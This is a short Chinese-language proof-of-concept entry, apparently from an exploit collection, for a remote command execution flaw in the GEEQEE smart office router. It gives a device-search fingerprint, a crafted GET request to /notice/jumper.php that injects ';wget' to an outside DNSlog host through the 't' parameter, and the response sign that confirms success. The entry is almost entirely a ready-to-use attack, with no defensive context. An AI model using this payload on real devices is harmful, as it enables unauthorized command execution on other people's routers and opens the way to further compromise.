# 极企智能办公路由某接口存在RCE漏洞

极企智能办公路由某接口 ｜ 命令执行 ｜ —
- **指纹**：`app="GEEQEE-极企智能办公路由"`
- **请求**：`GET /notice/jumper.php?t=;wget%20http://xxx.dnslog.cn HTTP/1.1`
- **响应特征**：200 dnslog回显ip